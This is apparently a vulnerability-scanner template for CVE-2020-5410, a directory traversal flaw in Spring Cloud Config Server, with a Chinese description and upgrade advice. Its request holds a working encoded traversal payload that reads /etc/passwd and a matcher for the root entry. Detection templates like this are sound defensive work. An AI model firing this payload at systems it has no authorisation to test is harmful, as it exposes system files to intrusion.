id: CVE-2020-5410
info:
  name: Directory Traversal in Spring Cloud Config Server
  author:
  - l0ne1y
  description: |-
    SpringCloud Config目录穿越漏洞
    Spring Cloud Config，2.2.3之前的2.2.x版本，2.1.9之前的2.1.x版本以及较旧的不受支持的版本允许应用程序通过spring-cloud-config-server模块提供任意配置文件。恶意用户或攻击者可以使用特制URL发送请求，这可能导致目录遍历攻击
  severity: high
  remediation: |-
    #### 官方修复方案：
    升级系统至无漏洞版本，或于官网下载安全补丁。
    #### 临时修复方案：
    升级到 Spring Cloud Config 至2.2.3版本或2.1.9版本，并且将Spring-Cloud-Config-Server服务放置在内网中，同时使用Spring Security进行身份验证。
    ###### 最新版本下载地址为：[https://github.com/spring-cloud/spring-cloud-config/releases。](https://github.com/spring-cloud/spring-cloud-config/releases。)
requests:
- matchers:
  - type: status
    status:
    - 200
  - type: regex
    part: body
    regex:
    - 'root:.*:0:0:'
  matchers-condition: and
  path:
  - '{{BaseURL}}/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%23foo/development'
  method: GET
